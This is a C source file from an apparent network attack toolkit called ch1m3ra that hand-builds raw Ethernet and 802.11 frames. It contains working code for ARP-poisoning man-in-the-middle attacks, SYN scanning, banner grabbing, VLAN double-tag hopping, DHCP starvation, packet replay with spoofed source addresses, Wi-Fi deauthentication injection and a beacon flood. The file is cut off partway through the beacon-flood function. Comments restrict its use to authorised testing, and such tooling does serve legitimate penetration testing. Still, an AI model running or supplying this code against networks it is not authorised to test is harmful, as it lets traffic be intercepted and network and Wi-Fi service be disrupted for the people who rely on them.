/* craft.c - raw frame crafting + transmit (active tools) */

#include "ch1m3ra.h"

/* ---------- raw frame crafting + transmit (active tools) ----------
 * Everything below builds Ethernet frames by hand and sends them on an
 * AF_PACKET socket.  These require root and an explicit flag; they put real
 * packets on the wire.  Use only on networks you own or are authorised to
 * test.  Ctrl-C stops them and, for ARP, restores the poisoned caches.      */

typedef struct {
    int   fd;
    int   ifindex;
    uint8_t mac[6];             /* our interface MAC */
    char  ifname[IF_NAMESIZE];
} tx_t;

static tx_t tx;

static int tx_open(const char *iface) {
    if (!iface) { fprintf(stderr, "ch1m3ra: active tool needs -i <iface>\n"); return -1; }
    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (fd < 0) {
        fprintf(stderr, "ch1m3ra: socket(AF_PACKET): %s\n", strerror(errno));
        if (errno == EPERM)
            fprintf(stderr, "ch1m3ra: active tools need root (or cap_net_raw)\n");
        return -1;
    }
    struct ifreq ifr;
    memset(&ifr, 0, sizeof ifr);
    snprintf(ifr.ifr_name, sizeof ifr.ifr_name, "%s", iface);
    if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0) {
        fprintf(stderr, "ch1m3ra: no such interface: %s\n", iface);
        close(fd); return -1;
    }
    tx.ifindex = ifr.ifr_ifindex;
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        fprintf(stderr, "ch1m3ra: SIOCGIFHWADDR: %s\n", strerror(errno));
        close(fd); return -1;
    }
    memcpy(tx.mac, ifr.ifr_hwaddr.sa_data, 6);
    snprintf(tx.ifname, sizeof tx.ifname, "%s", iface);

    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof sll);
    sll.sll_family = AF_PACKET;
    sll.sll_protocol = htons(ETH_P_ALL);
    sll.sll_ifindex = tx.ifindex;
    if (bind(fd, (struct sockaddr *)&sll, sizeof sll) < 0) {
        fprintf(stderr, "ch1m3ra: bind %s: %s\n", iface, strerror(errno));
        close(fd); return -1;
    }
    tx.fd = fd;
    return 0;
}

static int tx_send(const uint8_t *frame, size_t len) {
    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof sll);
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = tx.ifindex;
    sll.sll_halen = 6;
    memcpy(sll.sll_addr, frame, 6);
    ssize_t n = sendto(tx.fd, frame, len, 0, (struct sockaddr *)&sll, sizeof sll);
    return n == (ssize_t)len ? 0 : -1;
}

/* ---- frame builders ---- */

/* Ethernet + ARP (op 1 request / 2 reply), sender IP/MAC + target IP/MAC */
static size_t build_arp(uint8_t *f, uint16_t op,
                        const uint8_t *smac, const uint8_t *sip,
                        const uint8_t *tmac, const uint8_t *tip) {
    memcpy(f, tmac, 6);
    memcpy(f + 6, smac, 6);
    f[12] = 0x08; f[13] = 0x06;
    uint8_t *a = f + 14;
    a[0] = 0; a[1] = 1;
    a[2] = 0x08; a[3] = 0x00;
    a[4] = 6; a[5] = 4;
    a[6] = op >> 8; a[7] = (uint8_t)op;
    memcpy(a + 8, smac, 6);
    memcpy(a + 14, sip, 4);
    memcpy(a + 18, tmac, 6);
    memcpy(a + 24, tip, 4);
    return 14 + 28;
}

/* Ethernet + IPv4 + TCP; returns frame length.  Computes both checksums. */
static size_t build_tcp(uint8_t *f, const uint8_t *smac, const uint8_t *dmac,
                        const uint8_t *sip, const uint8_t *dip,
                        uint16_t sport, uint16_t dport, uint32_t seq, uint32_t ack,
                        uint8_t flags, const uint8_t *payload, size_t plen) {
    memcpy(f, dmac, 6); memcpy(f + 6, smac, 6);
    f[12] = 0x08; f[13] = 0x00;
    uint8_t *ip = f + 14;
    size_t tcp_len = 20 + plen;
    size_t ip_len = 20 + tcp_len;
    ip[0] = 0x45; ip[1] = 0;
    ip[2] = (uint8_t)(ip_len >> 8); ip[3] = (uint8_t)ip_len;
    ip[4] = 0; ip[5] = 0;
    ip[6] = 0x40; ip[7] = 0;                 /* DF */
    ip[8] = 64;                              /* TTL */
    ip[9] = 6;                               /* TCP */
    memcpy(ip + 12, sip, 4); memcpy(ip + 16, dip, 4);
    ip[10] = ip[11] = 0;
    ip[10] = (uint8_t)(ck_fold(ck_add(0, ip, 20)) >> 8);
    ip[11] = (uint8_t)ck_fold(ck_add(0, ip, 20));

    uint8_t *t = ip + 20;
    t[0] = (uint8_t)(sport >> 8); t[1] = (uint8_t)sport;
    t[2] = (uint8_t)(dport >> 8); t[3] = (uint8_t)dport;
    t[4] = (uint8_t)(seq >> 24); t[5] = (uint8_t)(seq >> 16);
    t[6] = (uint8_t)(seq >> 8); t[7] = (uint8_t)seq;
    t[8] = (uint8_t)(ack >> 24); t[9] = (uint8_t)(ack >> 16);
    t[10] = (uint8_t)(ack >> 8); t[11] = (uint8_t)ack;
    t[12] = 0x50;                            /* data offset 5, no options */
    t[13] = flags;
    t[14] = 0xff; t[15] = 0xff;              /* window */
    t[16] = t[17] = 0;                       /* checksum placeholder */
    t[18] = t[19] = 0;
    if (plen && payload) memcpy(t + 20, payload, plen);

    /* TCP pseudo-header checksum */
    uint32_t s = 0;
    s = ck_add(s, sip, 4);
    s = ck_add(s, dip, 4);
    s += 6;
    s += (uint32_t)tcp_len;
    s = ck_add(s, t, tcp_len);
    uint16_t ck = ck_fold(s);
    t[16] = (uint8_t)(ck >> 8); t[17] = (uint8_t)ck;
    return 14 + ip_len;
}

/* Ethernet + IPv4 + UDP (used for DHCP) */
static size_t build_udp(uint8_t *f, const uint8_t *smac, const uint8_t *dmac,
                        const uint8_t *sip, const uint8_t *dip,
                        uint16_t sport, uint16_t dport, const uint8_t *payload, size_t plen) {
    memcpy(f, dmac, 6); memcpy(f + 6, smac, 6);
    f[12] = 0x08; f[13] = 0x00;
    uint8_t *ip = f + 14;
    size_t udp_len = 8 + plen;
    size_t ip_len = 20 + udp_len;
    ip[0] = 0x45; ip[1] = 0;
    ip[2] = (uint8_t)(ip_len >> 8); ip[3] = (uint8_t)ip_len;
    ip[4] = 0; ip[5] = 0;
    ip[6] = 0; ip[7] = 0;
    ip[8] = 64;
    ip[9] = 17;                              /* UDP */
    memcpy(ip + 12, sip, 4); memcpy(ip + 16, dip, 4);
    ip[10] = ip[11] = 0;
    uint16_t ipck = ck_fold(ck_add(0, ip, 20));
    ip[10] = (uint8_t)(ipck >> 8); ip[11] = (uint8_t)ipck;

    uint8_t *u = ip + 20;
    u[0] = (uint8_t)(sport >> 8); u[1] = (uint8_t)sport;
    u[2] = (uint8_t)(dport >> 8); u[3] = (uint8_t)dport;
    u[4] = (uint8_t)(udp_len >> 8); u[5] = (uint8_t)udp_len;
    u[6] = u[7] = 0;
    if (plen && payload) memcpy(u + 8, payload, plen);
    /* UDP checksum (optional for v4, but compute it) */
    uint32_t s = 0;
    s = ck_add(s, sip, 4);
    s = ck_add(s, dip, 4);
    s += 17;
    s += (uint32_t)udp_len;
    s = ck_add(s, u, udp_len);
    uint16_t ck = ck_fold(s);
    if (!ck) ck = 0xffff;
    u[6] = (uint8_t)(ck >> 8); u[7] = (uint8_t)ck;
    return 14 + ip_len;
}

/* resolve an IPv4 string to 4 bytes + its MAC via ARP (best-effort) */
static int arp_resolve(int fd, int ifindex, const uint8_t *our_mac,
                       const uint8_t *our_ip, const uint8_t *target_ip, uint8_t *mac_out);

/* ---- --arp-poison ---- */
void arp_poison_run(const char *spec, const char *iface) {
    char buf[256];
    snprintf(buf, sizeof buf, "%s", spec);
    char *victim = strtok(buf, ",");
    char *gw = strtok(NULL, ",");
    char *if2 = strtok(NULL, ",");
    if (!victim || !gw) {
        fprintf(stderr, "ch1m3ra: --arp-poison needs <victim>,<gateway>[,<iface>]\n");
        exit(2);
    }
    const char *dev = if2 ? if2 : iface;
    if (!dev) { fprintf(stderr, "ch1m3ra: --arp-poison needs an interface (-i or 3rd field)\n"); exit(2); }

    uint8_t vip[4], gip[4];
    if (inet_pton(AF_INET, victim, vip) != 1 || inet_pton(AF_INET, gw, gip) != 1) {
        fprintf(stderr, "ch1m3ra: --arp-poison needs IPv4 addresses\n"); exit(2);
    }
    if (tx_open(dev) != 0) exit(1);

    fprintf(stderr, "%s== ARP poison ==%s iface %s  victim %s  gateway %s\n",
            CRED, C0, dev, victim, gw);
    fprintf(stderr, "ch1m3ra: sending forged ARP to MITM %s <-> %s. Ctrl-C stops.\n",
            victim, gw);

    uint8_t bcast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
    /* learn both MACs so we can answer directly */
    uint8_t ourip[4] = {0,0,0,0};
    uint8_t vmac[6], gmac[6];
    memset(vmac, 0, 6); memset(gmac, 0, 6);
    arp_resolve(tx.fd, tx.ifindex, tx.mac, ourip, vip, vmac);
    arp_resolve(tx.fd, tx.ifindex, tx.mac, ourip, gip, gmac);

    uint8_t f[64];
    struct sigaction sa; memset(&sa, 0, sizeof sa);
    sa.sa_handler = on_sigint; sigaction(SIGINT, &sa, NULL); sigaction(SIGTERM, &sa, NULL);

    int rounds = 0;
    while (!g_stop) {
        /* tell victim: gateway IP is at our MAC */
        size_t n = build_arp(f, 2, tx.mac, gip, vmac[0] ? vmac : bcast, vip);
        tx_send(f, n);
        /* tell gateway: victim IP is at our MAC */
        n = build_arp(f, 2, tx.mac, vip, gmac[0] ? gmac : bcast, gip);
        tx_send(f, n);
        if (++rounds % 5 == 0)
            fprintf(stderr, "ch1m3ra: arp-poison round %d sent\n", rounds);
        struct timespec ts = {1, 0};
        nanosleep(&ts, NULL);
    }
    /* restore: send the true bindings a few times */
    fprintf(stderr, "ch1m3ra: restoring ARP caches...\n");
    for (int i = 0; i < 5; i++) {
        if (vmac[0]) { size_t n = build_arp(f, 2, vmac, gip, tx.mac, vip); tx_send(f, n); }
        if (gmac[0]) { size_t n = build_arp(f, 2, gmac, vip, tx.mac, gip); tx_send(f, n); }
        struct timespec ts = {0, 200000000};
        nanosleep(&ts, NULL);
    }
    close(tx.fd);
}

/* parse "22,80,443" or "1-1024" into ports[]; returns count */
static int parse_ports(const char *s, long *ports, int maxp) {
    int n = 0;
    while (s && *s && n < maxp) {
        char *end = NULL;
        long a = strtol(s, &end, 10);
        s = end;
        long b = a;
        if (s && *s == '-') {
            s++;
            b = strtol(s, &end, 10);
            s = end;
        }
        if (b < a) { long t = a; a = b; b = t; }
        if (a < 1) a = 1;
        if (b > 65535) b = 65535;
        for (long p = a; p <= b && n < maxp; p++) ports[n++] = p;
        if (s && *s) s++;      /* skip the ',' / '-' separator */
    }
    return n;
}

/* wait for a frame matching our filter; returns byte length, or -1 on timeout */
static ssize_t rx_wait(int fd, uint8_t *b, size_t sz, int timeout_ms) {
    struct pollfd p = { .fd = fd, .events = POLLIN };
    int rc = poll(&p, 1, timeout_ms);
    if (rc <= 0) return -1;
    struct sockaddr_ll sll; socklen_t sl = sizeof sll;
    return recvfrom(fd, b, sz, 0, (struct sockaddr *)&sll, &sl);
}

static int arp_resolve(int fd, int ifindex, const uint8_t *our_mac,
                       const uint8_t *our_ip, const uint8_t *target_ip, uint8_t *mac_out) {
    (void)ifindex;
    uint8_t f[64], rbuf[2048];
    uint8_t bcast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
    /* source IP unknown here (caller passes zeros); use 0.0.0.0 probe */
    size_t n = build_arp(f, 1, our_mac, our_ip, bcast, target_ip);
    if (tx_send(f, n) != 0) return -1;
    for (int tries = 0; tries < 3; tries++) {
        ssize_t got = rx_wait(fd, rbuf, sizeof rbuf, 300);
        if (got < 42) continue;
        if (rbuf[12] != 0x08 || rbuf[13] != 0x06) continue;
        if (rbuf[20] != 0 || rbuf[21] != 2) continue;      /* ARP reply */
        if (memcmp(rbuf + 14 + 14, target_ip, 4) != 0) continue;
        memcpy(mac_out, rbuf + 14 + 8, 6);
        return 0;
    }
    return -1;
}

/* ---- --syn-scan ---- */
void syn_scan_run(const char *spec, const char *iface) {
    if (!iface) { fprintf(stderr, "ch1m3ra: --syn-scan needs -i <iface>\n"); exit(2); }
    char host[128]; snprintf(host, sizeof host, "%s", spec);
    char *colon = strrchr(host, ':');
    const char *portspec = "1-1024";
    if (colon) { *colon = 0; portspec = colon + 1; }

    uint8_t dip[4];
    if (inet_pton(AF_INET, host, dip) != 1) {
        fprintf(stderr, "ch1m3ra: --syn-scan needs an IPv4 host (got %s)\n", host); exit(2);
    }
    static long ports[65536];
    int np = parse_ports(portspec, ports, 65536);
    if (np <= 0) { fprintf(stderr, "ch1m3ra: no ports to scan\n"); exit(2); }

    if (tx_open(iface) != 0) exit(1);
    fprintf(stderr, "%s== SYN scan ==%s %s (%d ports) on %s\n", CRED, C0, host, np, iface);

    /* resolve target MAC (uses ARP; needs our IP for a clean probe) */
    uint8_t ourip[4] = {0,0,0,0};
    uint8_t dmac[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
    struct ifreq ifr; memset(&ifr, 0, sizeof ifr);
    snprintf(ifr.ifr_name, sizeof ifr.ifr_name, "%s", iface);
    if (ioctl(tx.fd, SIOCGIFADDR, &ifr) == 0)
        memcpy(ourip, &((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr, 4);
    if (ourip[0]) arp_resolve(tx.fd, tx.ifindex, tx.mac, ourip, dip, dmac);

    uint8_t sip[4]; memcpy(sip, ourip, 4);
    uint8_t f[128];
    uint8_t bcast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
    if (!sip[0]) { fprintf(stderr, "ch1m3ra: could not determine local IP\n"); exit(1); }
    if (dmac[0] == 0xff) memcpy(dmac, bcast, 6);

    int open_ct = 0, closed_ct = 0, filt_ct = 0;
    for (int i = 0; i < np && !g_stop; i++) {
        uint16_t sport = (uint16_t)(40000 + (i % 20000));
        size_t n = build_tcp(f, tx.mac, dmac, sip, dip, sport, (uint16_t)ports[i],
                             0x12345678u, 0, 0x02 /* SYN */, NULL, 0);
        tx_send(f, n);
        /* wait briefly for SYN/ACK (open) or RST (closed) */
        int verdict = 0;   /* 0 filtered */
        for (int t = 0; t < 3 && !verdict; t++) {
            uint8_t rbuf[2048];
            ssize_t got = rx_wait(tx.fd, rbuf, sizeof rbuf, 120);
            if (got < 54) break;                       /* need eth+ip+tcp */
            if (rbuf[12] != 0x08 || rbuf[13] != 0x00) continue;
            size_t ihl = (size_t)(rbuf[14] & 0xf) * 4;
            if (ihl < 20 || (size_t)got < 14 + ihl + 20) continue;
            if (rbuf[14 + 9] != 6) continue;
            if (memcmp(rbuf + 14 + 12, dip, 4) != 0) continue;   /* src must be target */
            uint8_t *t2 = rbuf + 14 + ihl;
            uint16_t rsp = rd16(t2);       /* src port in reply */
            uint16_t rdp = rd16(t2 + 2);   /* dst port = our source port */
            if (rdp != sport || rsp != (uint16_t)ports[i]) continue;
            uint8_t flags = t2[13];
            if (flags & 0x12) verdict = 1;        /* SYN|ACK = open */
            else if (flags & 0x04) verdict = 2;   /* RST = closed */
            /* send RST to tear down half-open */
            if (verdict == 1) {
                size_t rn = build_tcp(f, tx.mac, dmac, sip, dip, sport,
                                      (uint16_t)ports[i], rd32(t2 + 8), 0,
                                      0x04, NULL, 0);
                tx_send(f, rn);
            }
        }
        if (verdict == 1) { printf("%-6ld open\n", ports[i]); open_ct++; }
        else if (verdict == 2) closed_ct++;
        else filt_ct++;
    }
    printf("ch1m3ra: scan done: %d open, %d closed, %d filtered\n",
           open_ct, closed_ct, filt_ct);
    close(tx.fd);
}

/* ---- --banner-grab ---- */
/* Full TCP connect() to each port and read whatever the service says first.
 * Uses the kernel stack (no raw crafting) so it works through normal routing;
 * this is an active probe and is therefore still behind root + an explicit
 * flag.  Prints "<port> <service-ish first line>" for every port that talks. */
void banner_grab_run(const char *spec, const char *iface, int timeout_ms) {
    (void)iface;
    if (timeout_ms <= 0) timeout_ms = 1500;

    char host[128]; snprintf(host, sizeof host, "%s", spec);
    char *colon = strrchr(host, ':');
    const char *portspec = "22,21,23,25,80,110,143,443,3306,5432,6379,8080";
    if (colon) { *colon = 0; portspec = colon + 1; }

    struct addrinfo hints; memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    static long ports[65536];
    int np = parse_ports(portspec, ports, 65536);
    if (np <= 0) { fprintf(stderr, "ch1m3ra: no ports to probe\n"); exit(2); }

    fprintf(stderr, "%s== banner grab ==%s %s (%d ports)\n", CRED, C0, host, np);
    int got = 0;
    for (int i = 0; i < np && !g_stop; i++) {
        char portstr[8]; snprintf(portstr, sizeof portstr, "%ld", ports[i]);
        struct addrinfo *res = NULL;
        if (getaddrinfo(host, portstr, &hints, &res) != 0 || !res) continue;

        int fd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
        if (fd < 0) { freeaddrinfo(res); continue; }

        struct timeval tv = { timeout_ms / 1000, (timeout_ms % 1000) * 1000 };
        setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof tv);
        setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof tv);

        if (connect(fd, res->ai_addr, res->ai_addrlen) == 0) {
            /* some services greet on connect; some wait for a nudge.  Send a
             * harmless newline/HTTP HEAD for the ones that need a prompt. */
            const char *probe = "";
            if (ports[i] == 80 || ports[i] == 8080)
                probe = "HEAD / HTTP/1.0\r\n\r\n";
            if (*probe) { ssize_t w = write(fd, probe, strlen(probe)); (void)w; }

            char buf[256];
            ssize_t n = read(fd, buf, sizeof buf - 1);
            if (n > 0) {
                buf[n] = 0;
                for (ssize_t k = 0; k < n; k++)
                    if (buf[k] == '\r' || buf[k] == '\n') buf[k] = ' ';
                /* trim trailing spaces so the column output looks tidy */
                while (n > 0 && buf[n - 1] == ' ') buf[--n] = 0;
                printf("%-6ld %s\n", ports[i], buf);
                got++;
            } else {
                printf("%-6ld open (no banner)\n", ports[i]);
                got++;
            }
        }
        close(fd);
        freeaddrinfo(res);
    }
    printf("ch1m3ra: banner grab done: %d responding\n", got);
}

/* ---- --vlan-hop ---- */
/* Classic double-tagging VLAN hop: send frames carrying an outer 802.1Q tag
 * (the attacker's/native VLAN) plus an inner tag for the VLAN we want to reach.
 * A switch that only strips the outer tag forwards the frame onto the inner
 * VLAN.  spec = "<iface>:<outer_vlan>:<inner_vlan>"; iface falls back to -i. */
void vlan_hop_run(const char *spec, const char *iface) {
    char buf[128]; snprintf(buf, sizeof buf, "%s", spec);
    char *tok1 = strtok(buf, ":");
    char *tok2 = strtok(NULL, ":");
    char *tok3 = strtok(NULL, ":");
    const char *dev = iface;
    long outer = 1, inner = 1;
    if (tok2 && tok3) {       /* iface:outer:inner */
        dev = tok1; outer = atol(tok2); inner = atol(tok3);
    } else if (tok1 && tok2) { /* outer:inner */
        outer = atol(tok1); inner = atol(tok2);
    } else if (tok1) {         /* iface  (defaults 1/1) */
        dev = tok1;
    }
    if (!dev) { fprintf(stderr, "ch1m3ra: --vlan-hop needs <iface>:<outer>:<inner>\n"); exit(2); }
    if (outer < 1 || outer > 4094) outer = 1;
    if (inner < 1 || inner > 4094) inner = 1;
    if (tx_open(dev) != 0) exit(1);

    fprintf(stderr, "%s== VLAN hop (double tagging) ==%s %s  outer=%ld inner=%ld\n",
            CRED, C0, dev, outer, inner);

    uint8_t bcast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
    uint8_t f[60];
    memset(f, 0, sizeof f);
    /* dst / src */
    memcpy(f, bcast, 6);
    memcpy(f + 6, tx.mac, 6);
    /* outer 802.1ad S-tag: TPID 0x88a8, PCP/DEI/VID */
    size_t o = 12;
    f[o++] = 0x88; f[o++] = 0xa8;
    f[o++] = (uint8_t)(outer >> 8); f[o++] = (uint8_t)outer;
    /* inner 802.1Q C-tag */
    f[o++] = 0x81; f[o++] = 0x00;
    f[o++] = (uint8_t)(inner >> 8); f[o++] = (uint8_t)inner;
    /* ethertype: ARP so the switch floods it and we can observe leaking */
    f[o++] = 0x08; f[o++] = 0x06;
    /* minimal ARP request for 0.0.0.0 -> 0.0.0.0 in the inner VLAN */
    uint8_t *a = f + o;
    a[0] = 0; a[1] = 1; a[2] = 0x08; a[3] = 0x00;
    a[4] = 6; a[5] = 4; a[6] = 0; a[7] = 1;         /* request */
    memcpy(a + 8, tx.mac, 6);
    /* spa/tpa left 0.0.0.0 (probe) */
    size_t flen = o + 28;
    if (flen < 60) flen = 60;                        /* pad to Ethernet minimum */

    int rounds = 0;
    struct sigaction sa; memset(&sa, 0, sizeof sa);
    sa.sa_handler = on_sigint; sigaction(SIGINT, &sa, NULL); sigaction(SIGTERM, &sa, NULL);
    while (!g_stop) {
        tx_send(f, flen);
        if (++rounds % 5 == 0)
            fprintf(stderr, "ch1m3ra: vlan-hop round %d sent (watch for replies)\n", rounds);
        struct timespec ts = {1, 0};
        nanosleep(&ts, NULL);
    }
    fprintf(stderr, "ch1m3ra: vlan-hop sent %d round(s)\n", rounds);
    close(tx.fd);
}

/* ---- --dhcp-starve ---- */
void dhcp_starve_run(const char *spec, const char *iface) {
    char buf[128]; snprintf(buf, sizeof buf, "%s", spec);
    char *colon = strrchr(buf, ':');
    long count = 256;
    if (colon) { *colon = 0; count = atol(colon + 1); if (count <= 0) count = 256; }
    const char *dev = buf[0] ? buf : iface;
    if (!dev) { fprintf(stderr, "ch1m3ra: --dhcp-starve needs <iface>[:<count>]\n"); exit(2); }
    if (tx_open(dev) != 0) exit(1);

    fprintf(stderr, "%s== DHCP starvation ==%s %s -> %ld random clients. Ctrl-C stops.\n",
            CRED, C0, dev, count);

    uint8_t bcast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
    uint8_t anyip[4] = {0,0,0,0};
    uint8_t bcastip[4] = {255,255,255,255};
    uint8_t f[512];
    struct sigaction sa; memset(&sa, 0, sizeof sa);
    sa.sa_handler = on_sigint; sigaction(SIGINT, &sa, NULL);

    long sent = 0;
    for (long i = 0; i < count && !g_stop; i++) {
        uint8_t d[300];
        memset(d, 0, sizeof d);
        d[0] = 1; d[1] = 1; d[2] = 6; d[3] = 0;      /* BOOTREQUEST, htype=ether */
        /* xid */
        uint32_t xid = (uint32_t)(0xdead0000u + i);
        d[4] = xid >> 24; d[5] = xid >> 16; d[6] = xid >> 8; d[7] = xid;
        /* chaddr: random client MAC */
        for (int k = 0; k < 6; k++) d[28 + k] = (uint8_t)(0x02 + (i * 7 + k * 13));
        d[236] = 0x63; d[237] = 0x82; d[238] = 0x53; d[239] = 0x63;   /* magic */
        d[240] = 53; d[241] = 1; d[242] = 1;         /* option 53: DISCOVER */
        d[243] = 55; d[244] = 3; d[245] = 1; d[246] = 3; d[247] = 6;  /* param list */
        d[248] = 255;                                /* end */
        size_t dhcp_len = 249;
        size_t n = build_udp(f, tx.mac, bcast, anyip, bcastip, 68, 67, d, dhcp_len);
        tx_send(f, n);
        sent++;
        if (sent % 32 == 0)
            fprintf(stderr, "ch1m3ra: %ld DHCP DISCOVERs sent\n", sent);
        struct timespec ts = {0, 20000000};
        nanosleep(&ts, NULL);
    }
    fprintf(stderr, "ch1m3ra: dhcp-starve sent %ld DISCOVERs total\n", sent);
    close(tx.fd);
}

/* ---- --replay (with optional --rewrite-src) ---- */
void replay_run(const char *pcap, const char *rewrite, const char *iface) {
    if (!iface) { fprintf(stderr, "ch1m3ra: --replay needs -i <iface>\n"); exit(2); }
    pcapin_t pr;
    if (pcapin_open(&pr, pcap) != 0) exit(1);
    if (tx_open(iface) != 0) exit(1);

    uint8_t rw[4]; int have_rw = 0;
    if (rewrite && inet_pton(AF_INET, rewrite, rw) == 1) have_rw = 1;

    fprintf(stderr, "%s== replay ==%s %s on %s%s%s%s\n", CRED, C0, pcap, iface,
            have_rw ? "  rewrite-src=" : "", have_rw ? rewrite : "", "");
    long n = 0, edited = 0;
    static uint8_t buf[65536];
    size_t cap, wire; struct timespec ts;
    int rc;
    while ((rc = pcapin_next(&pr, buf, sizeof buf, &cap, &wire, &ts)) == 1) {
        if (cap >= 34 && buf[12] == 0x08 && buf[13] == 0x00 && have_rw) {
            size_t ihl_off = 14 + 12;
            if (memcmp(buf + ihl_off, rw, 4) != 0) {
                memcpy(buf + ihl_off, rw, 4);
                /* recompute IPv4 header checksum */
                size_t ihl = (size_t)(buf[14] & 0xf) * 4;
                buf[14 + 10] = buf[14 + 11] = 0;
                uint16_t ck = ck_fold(ck_add(0, buf + 14, ihl));
                buf[14 + 10] = (uint8_t)(ck >> 8);
                buf[14 + 11] = (uint8_t)ck;
                edited++;
            }
        }
        if (tx_send(buf, cap) == 0) n++;
        struct timespec ts2 = {0, 1000000};
        nanosleep(&ts2, NULL);
    }
    if (rc < 0) { fprintf(stderr, "ch1m3ra: replay read error\n"); }
    fclose(pr.f);
    close(tx.fd);
    printf("ch1m3ra: replayed %ld frame(s), %ld rewritten\n", n, edited);
}

/* ---- 802.11 injection (--deauth / --beacon-flood) -------------------------
 * These craft raw 802.11 frames and inject them over a monitor-mode vif.
 * A minimal radiotap header (RATE present) is prepended, which is what
 * mac80211 drivers expect for injected frames.  Requires the interface to be a
 * monitor vif on the target channel; the kernel adds the FCS.  Authorised
 * testing only. */

/* parse "aa:bb:cc:dd:ee:ff" into 6 bytes; returns 0 on success */
static int parse_mac(const char *s, uint8_t *out) {
    unsigned v[6];
    if (!s || sscanf(s, "%x:%x:%x:%x:%x:%x", &v[0], &v[1], &v[2],
                     &v[3], &v[4], &v[5]) != 6) return -1;
    for (int i = 0; i < 6; i++) {
        if (v[i] > 0xff) return -1;
        out[i] = (uint8_t)v[i];
    }
    return 0;
}

/* prepend a 9-byte radiotap header (present = RATE) with the given rate */
static size_t rt_prefix(uint8_t *f, uint8_t rate) {
    /* ver 0, pad 0, len 9 (LE), present = 1<<2 (RATE, LE) */
    f[0] = 0; f[1] = 0; f[2] = 9; f[3] = 0;
    f[4] = 0x04; f[5] = 0; f[6] = 0; f[7] = 0;
    f[8] = rate;
    return 9;
}

void deauth_run(const char *spec, const char *iface) {
    char buf[128]; snprintf(buf, sizeof buf, "%s", spec);
    char *tok[3] = {0, 0, 0};
    int nt = 0;
    for (char *p = strtok(buf, ","); p && nt < 3; p = strtok(NULL, ",")) tok[nt++] = p;

    uint8_t bssid[6], client[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
    if (nt < 1 || parse_mac(tok[0], bssid) != 0) {
        fprintf(stderr, "ch1m3ra: --deauth needs <bssid>[,<client>][,<count>]\n"); exit(2);
    }
    long count = 0;
    if (nt >= 2 && parse_mac(tok[1], client) != 0) {
        /* second token was not a MAC: treat it as the count */
        count = atol(tok[1]);
    } else if (nt >= 3) {
        count = atol(tok[2]);
    }
    if (!iface) { fprintf(stderr, "ch1m3ra: --deauth needs -i <monitor-iface>\n"); exit(2); }
    if (tx_open(iface) != 0) exit(1);

    fprintf(stderr, "%s== 802.11 deauth injection ==%s %s bssid=%02x:%02x:%02x:%02x:%02x:%02x "
            "client=%02x:%02x:%02x:%02x:%02x:%02x%s\n", CRED, C0, iface,
            bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],
            client[0],client[1],client[2],client[3],client[4],client[5],
            count ? "" : " (Ctrl-C stops)");

    struct sigaction sa; memset(&sa, 0, sizeof sa);
    sa.sa_handler = on_sigint; sigaction(SIGINT, &sa, NULL); sigaction(SIGTERM, &sa, NULL);

    uint8_t f[64];
    long sent = 0, round = 0, failed = 0;
    while (!g_stop && (count == 0 || sent < count)) {
        size_t o = rt_prefix(f, 2);              /* 1 Mb/s */
        /* 802.11 deauth: FC=0x00c0 (mgmt, subtype 12), duration 0 */
        f[o++] = 0xc0; f[o++] = 0x00;
        f[o++] = 0x00; f[o++] = 0x00;
        memcpy(f + o, client, 6); o += 6;        /* addr1 = DA (victim) */
        memcpy(f + o, bssid, 6);  o += 6;        /* addr2 = SA (AP) */
        memcpy(f + o, bssid, 6);  o += 6;        /* addr3 = BSSID */
        f[o++] = 0; f[o++] = 0;                  /* seq/frag */
        f[o++] = 0x07; f[o++] = 0x00;            /* reason: class-3 frame from nonassoc */
        if (tx_send(f, o) != 0) {
            if (failed++ == 0)
                fprintf(stderr, "ch1m3ra: deauth sendto failed: %s\n", strerror(errno));
        }
        sent++;
        if (++round % 64 == 0)
            fprintf(stderr, "ch1m3ra: deauth %ld frame(s) sent\n", sent);
        struct timespec ts = {0, 20000000};      /* ~50/s */
        nanosleep(&ts, NULL);
    }
    fprintf(stderr, "ch1m3ra: deauth sent %ld frame(s) total%s\n", sent,
            failed ? " (some rejected - is the vif in monitor mode?)" : "");
    close(tx.fd);
}

void beacon_flood_run(const char *spec, const char *iface) {
    char buf[160]; snprintf(buf, sizeof buf, "%s", spec);
    char *comma = strrchr(buf, ',');
    long count = 0;
    const char *ssid = buf;
    if (comma) { *comma = 0; count = atol(comma + 1); ssid = buf; }
    size_t ssidlen = strlen(ssid);
    if (ssidlen > 32) ssidlen = 32;
    if (!iface) { fprintf(stderr, "ch1m3ra: --beacon-flood needs -i <monitor-iface>\n"); exit(2); }
    if (tx_open(iface) != 0) exit(1);

    fprintf(stderr, "%s== 802.11 beacon flood ==%s %s ssid=\"%s\"%s\n", CRED, C0, iface,
            ssid, count ? "" : " (Ctrl-C stops)");

    struct sigaction sa; memset(&sa, 0, sizeof sa);
    sa.sa_handler = on_sigint; sigaction(SIGINT, &sa, NULL); sigaction(SIGTERM, &sa, NULL);

    uint8_t f[256];
    long sent = 0, failed = 0;
    uint32_t rng = 0x1234567u;
    while (!g_stop && (count == 0 || sent < count)) {
        /* random-ish BSSID per beacon (fake APs) */
        rng = rng * 1103515245u + 12345u;
        uint8_t bssid[6] = {0x02, (uint8_t)(rng >> 24), (uint8_t)(rng >> 16),
                            (uint8_t)(rng >> 8), (uint8_t)rng, (uint8_t)(rng >> 3)};
        size_t o = rt_prefix(f, 2);
        f[o++] = 0x80; f[o++] = 0x00;            /* FC: mgmt, subtype 8 (beacon) */
